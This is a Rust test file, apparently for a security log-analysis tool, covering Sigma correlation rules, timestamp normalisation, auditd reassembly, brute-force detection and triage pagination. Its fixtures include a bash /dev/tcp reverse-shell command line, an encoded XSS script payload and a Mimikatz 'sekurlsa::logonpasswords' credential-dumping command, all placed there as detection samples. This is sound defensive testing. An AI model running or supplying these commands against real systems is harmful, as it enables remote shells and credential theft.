    assert!(!contains(&evaluate(base, &[a.clone(), b.clone()]), "sigma:chain"));
    assert!(contains(&evaluate(&base.replace("temporal_ordered", "temporal"), &[a.clone(), b.clone()]), "sigma:chain"));
    b.fields.insert("used_id".into(), json!("another"));
    assert!(!contains(&evaluate(&base.replace("temporal_ordered", "temporal"), &[a.clone(), b]), "sigma:chain"));
    let count = base[..base.find("---\ntitle: Used").unwrap()].to_string()
        + r#"
---
title: Count
id: count
x-loginsight-evidence: {level: 1, rationale: "Specific test count", maturity: experimental}
correlation:
  type: value_count
  rules: [created]
  group-by: [host.name]
  timespan: 5m
  condition: {gte: 2, field: created_id}
"#;
    let mut c = a.clone();
    c.id = 2;
    assert!(!contains(&evaluate(&count, &[a.clone(), c.clone()]), "sigma:count"));
    c.fields.insert("created_id".into(), json!("object-2"));
    assert!(contains(&evaluate(&count, &[a.clone(), c.clone()]), "sigma:count"));
    a.fields.insert("bytes".into(), json!(40));
    c.fields.insert("bytes".into(), json!(60));
    let sum = count.replace("value_count", "value_sum").replace("gte: 2, field: created_id", "gte: 100, field: bytes");
    assert!(contains(&evaluate(&sum, &[a.clone(), c.clone()]), "sigma:count"));
    assert!(!contains(&evaluate(&sum, &[a.clone()]), "sigma:count"));
    let avg = sum.replace("value_sum", "value_avg").replace("gte: 100", "gte: 50");
    assert!(contains(&evaluate(&avg, &[a.clone(), c.clone()]), "sigma:count"));
    assert!(crate::sigma::convert_text(&sum.replace("gte: 100", "gt: 100")).is_err());
    assert!(crate::sigma::convert_text(&base.replace("temporal_ordered", "unknown_type")).is_err());
    assert!(crate::sigma::convert_text(&base.replace("[created, used]", "[chain, used]")).is_err());
    assert!(crate::sigma::convert_text(&base.replace("stage: created", "stage|unknown_modifier: created")).is_err());
    assert_eq!(crate::sigma::convert_text(base).unwrap()[0].def.evidence.assessed_level(), 0);
}

#[test]
fn security_custom_time_requires_units_or_explicit_timezone() {
    let e = event(0, 0, json!({"custom_time":"2026-09-26 10:00:00"}));
    let mut m: crate::security_normalize::SourceMapping =
        serde_json::from_value(json!({"source":"contract-test","fields":{"timestamp":"custom_time"}})).unwrap();
    let (view, n) = crate::security_normalize::normalize(&e, &[m.clone()]);
    assert!(view.timestamp.is_none());
    assert!(n.time.ambiguity.is_some());
    m.timezone = Some("-03:00".into());
    let (view, n) = crate::security_normalize::normalize(&e, &[m]);
    assert_eq!(view.timestamp, crate::sources::parse_timestamp("2026-09-26T13:00:00Z"));
    assert_eq!(n.time.field, "custom_time");
}

#[test]
fn security_audit_fragments_and_decoding_keep_original_provenance() {
    let mut syscall = event(0, 0, json!({"audit_serial":"42","type":"SYSCALL","Computer":"host","success":"yes"}));
    syscall.source = "auditd".into();
    let mut exec = syscall.clone();
    exec.id = 1;
    exec.fields.remove("success");
    exec.fields.insert("type".into(), json!("EXECVE"));
    exec.fields
        .extend(json!({"argc":3,"a0":"bash","a1":"-i","a2":"/dev/tcp/192.0.2.1/4"}).as_object().unwrap().clone());
    assert_eq!(crate::security_reconstruct::key(&syscall), crate::security_reconstruct::key(&exec));
    let operation = crate::security_reconstruct::assemble(vec![exec, syscall]).unwrap();
    assert_eq!(crate::entities::action_outcome(&operation.event), (Some("process_start"), Some("success")));
    assert_eq!(operation.members.len(), 2);
    assert!(operation.event.fields["cmdline"].as_str().unwrap().contains("/dev/tcp/"));
    let ev = event(0, 0, json!({"http.request.body":"%3Cscript%3Ealert(1)%3C/script%3E"}));
    let hits = crate::threats::builtin_catalog().explain(&ev);
    assert!(hits
        .iter()
        .any(|h| h.normalized && h.provenance.field == "http.request.body" && h.provenance.direction == "request"));
}

#[test]
fn security_nat_and_homonymous_accounts_do_not_supply_success() {
    let mut events:Vec<_>=(0..5).map(|i|event(i,i as i64,json!({"event.category":"authentication","event.action":"logon","event.outcome":"failure","host.name":"server","service.name":"ssh","user.name":"ana","user.domain":"a","source.ip":"192.0.2.1"}))).collect();
    let mut success = events[0].clone();
    success.id = 5;
    success.timestamp = events[4].timestamp.map(|t| t + 1000);
    success.fields.insert("event.outcome".into(), json!("success"));
    events.push(success);
    assert!(contains(&run(&events), "auth.bruteforce.success"));
    for field in ["user.name", "user.domain", "service.name", "host.name"] {
        let mut negative = events.clone();
        negative[5].fields.insert(field.into(), json!("different"));
        assert!(!contains(&run(&negative), "auth.bruteforce.success"), "{field}");
    }
}

#[test]
fn security_pagination_preserves_complete_episodes_and_classification() {
    let mut events = chains().remove(0).1;
    events.push(process(42, 20, "sekurlsa::logonpasswords"));
    let full = crate::triage::project(&serde_json::to_value(run(&events)).unwrap(), 1, None);
    let page = crate::triage::paginate(full.clone(), 0, 1).unwrap();
    assert_eq!(page["counts_by_level"], full["counts_by_level"]);
    assert_eq!(page["analysis_id"], full["analysis_id"]);
    assert_eq!(page["episodes"].as_array().unwrap().len(), 1);
    assert_eq!(page["episodes"][0]["event_refs"], full["episodes"][0]["event_refs"]);
    for d in page["detections"].as_array().unwrap() {
        let original = full["detections"].as_array().unwrap().iter().find(|a| a["id"] == d["id"]).unwrap();
        assert_eq!(original, d);
    }
    let defaults: crate::mcp::TriageParams = serde_json::from_str("{}").unwrap();
    assert_eq!(defaults.minimum_evidence.unwrap_or(5), 5);
    assert!(crate::triage::paginate(full, 0, 0).is_err());
}
